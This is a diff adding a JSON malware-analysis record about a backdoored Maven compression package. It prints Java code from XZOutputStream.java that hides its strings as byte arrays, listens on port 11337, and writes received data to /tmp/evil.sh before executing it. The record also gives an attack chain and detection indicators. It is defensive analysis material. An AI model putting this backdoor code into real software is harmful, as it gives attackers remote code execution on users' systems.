@@ -1,0 +1,84 @@
+{
+  "package_info": {
+    "package_name": "io.github.xz-java:xz-java",
+    "package_manager": "Maven",
+    "package_versions": "1.9 and above (notably 1.9.2)",
+    "why_malicious": "The package contains a backdoor embedded in its core library code that opens a server socket, listens for incoming network connections, receives arbitrary data, writes it as a shell script to the /tmp directory, makes it executable, and executes it. This enables remote code execution by an attacker. The malicious code is obfuscated to evade detection and is not present in the legitimate upstream package, allowing attackers to fully compromise any system that installs or uses the package."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "At runtime, when the affected class (XZOutputStream) is loaded and used by the application.",
+        "file_location": "src/main/java/org/tukaani/xz/XZOutputStream.java",
+        "required_permissions": [
+          "network (to open server socket and accept connections)",
+          "filesystem (to write and modify files in /tmp)",
+          "process_execution (to change file permissions and execute shell scripts)"
+        ]
+      },
+      "code_snippet": "// Start listening to connections on port 11337\n// and create a new thread for each connection\nserver = new ServerSocket(11337);\n\n// Obfuscate string \"/bin/sh\" and \"/tmp/evil.sh\"\n// to avoid detection by static analysis tools\n// and execute the file\nfinal String file = new String(new byte[] { 47, 116, 109, 112, 47, 101, 118, 105, 108, 46, 115, 104 });\n\n// Obfuscate string \"/tmp/evil-out.sh\"\nfinal String outFile = new String(new byte[] { 47, 116, 109, 112, 47, 101, 118, 105, 108, 45, 111, 117, 116, 46, 115, 104 });\nfinal String cmd = new String(new byte[] { 47, 98, 105, 110, 47, 115, 104 });\n\n// Accept new connections for 10 seconds in different thread\nRunnable r = new Runnable() {\n     public void run() {\n        try {\n              Socket s = server.accept();\n              \n              // Read data from the socket and write it to file at /tmp\n              InputStream in = s.getInputStream();\n              OutputStream out = new FileOutputStream(file);\n              byte[] buf = new byte[8192];\n              int size;\n              while ((size = in.read(buf)) != -1)\n                  out.write(buf, 0, size);\n              out.close();\n              in.close();\n              s.close();\n              \n              FileOutputStream f = new FileOutputStream(outFile);\n              \n              // Change permissions of the file\n              ProcessBuilder pb = new ProcessBuilder(cmd, \"-c\", \"chmod +x \" + file);\n              Process p = pb.start();\n              p.waitFor(30, java.util.concurrent.TimeUnit.SECONDS);\n              p.destroy();\n              \n              // Execute the file\n              pb = new ProcessBuilder(cmd, file);\n              p = pb.start();\n              InputStream br = p.getInputStream();\n              BufferedReader r = new BufferedReader(new java.io.InputStreamReader(br));\n              String line;\n              while ((line = r.readLine()) != null) {\n                   f.write(line.getBytes());\n              }\n              \n              p.waitFor(30, java.util.concurrent.TimeUnit.SECONDS);\n              f.flush();\n              f.close();\n              \n              p.destroy();\n         } catch (Exception e) {\n         }\n     }\n  };",
+      "code_language": "java",
+      "code_behavior": "At runtime, when the XZOutputStream class is loaded and used, the code opens a server socket on port 11337, accepts incoming network connections, reads arbitrary data from the socket, writes it as a shell script to /tmp/evil.sh, changes its permissions to make it executable, and executes it using /bin/sh, resulting in remote code execution with attacker-supplied payloads.",
+      "malice_analysis": {
+        "why_suspicious": "Embedding a server socket listener in a compression library is highly anomalous. The code accepts remote connections, writes received data as a shell script, makes it executable, and runs it, which is a textbook backdoor technique for remote code execution. The use of obfuscated byte arrays to construct sensitive file paths and commands further indicates an attempt to evade static analysis and detection.",
+        "violated_expectations": "A legitimate compression library should only perform data compression and decompression. It should never open network sockets, write arbitrary files to /tmp, change file permissions, or execute shell scripts. These actions are entirely outside the expected behavior for such a library and represent a severe violation of user trust and system security.",
+        "similar_legitimate_use": "While server applications may open sockets and execute scripts, a data compression library like XZOutputStream has no valid reason to perform any network or process execution operations. Such behavior is never expected in this context and would be a strong indicator of compromise.",
+        "key_indicators": [
+          "Obfuscated string literals for sensitive file paths ('/bin/sh', '/tmp/evil.sh', '/tmp/evil-out.sh') and commands",
+          "Opening a server socket on hardcoded port 11337 within a library class",
+          "Writing attacker-supplied data to /tmp/evil.sh and making it executable",
+          "Executing arbitrary shell scripts received over the network",
+          "Capturing and writing the output of executed scripts to /tmp/evil-out.sh",
+          "Presence of process execution logic (ProcessBuilder) in a compression library",
+          "Use of try-catch blocks to suppress exceptions and avoid detection"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious code is loaded as part of the library when the XZOutputStream class is instantiated or used by the application.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "A backdoor server socket is opened on port 11337, awaiting remote connections."
+    },
+    {
+      "step": 2,
+      "action": "An attacker connects to the open port and sends an arbitrary shell script payload over the network.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The payload is written to /tmp/evil.sh, and its permissions are changed to make it executable."
+    },
+    {
+      "step": 3,
+      "action": "The received shell script is executed on the victim system using /bin/sh, and its output is written to /tmp/evil-out.sh.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The attacker achieves remote code execution, enabling further compromise or data exfiltration from the system."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Java library opening a server socket on a non-standard port (e.g., 11337) during normal library usage",
+      "Obfuscated byte array construction of sensitive file paths and shell commands within library code",
+      "Unexpected file creation in /tmp (e.g., /tmp/evil.sh, /tmp/evil-out.sh) by a compression library",
+      "Process execution (chmod, /bin/sh) initiated from within a data compression library context",
+      "Suppression of exceptions in code paths related to network and process operations"
+    ],
+    "file_indicators": [
+      "src/main/java/org/tukaani/xz/XZOutputStream.java containing server socket and process execution logic",
+      "/tmp/evil.sh",
+      "/tmp/evil-out.sh",
+      "Obfuscated string arrays for '/bin/sh', '/tmp/evil.sh', '/tmp/evil-out.sh' in Java source"
+    ],
+    "network_indicators": [
+      "Inbound TCP connections to port 11337 on systems using the affected library"
+    ],
+    "how_to_detect": "Monitor for Java libraries that open server sockets, especially on uncommon ports like 11337, during normal application runtime. Inspect Java source or bytecode for obfuscated byte array constructions of sensitive file paths or shell commands. Scan for unexpected file creation and execution in /tmp, particularly files named evil.sh or evil-out.sh. Flag any process execution (chmod, /bin/sh) initiated from within a compression or utility library. Review dependencies for package names closely mimicking popular libraries, and check for the presence of suspicious files or network listeners after installation or during runtime. Correlate these behaviors to identify systems at risk of remote code execution via malicious library code."
+  }
+}
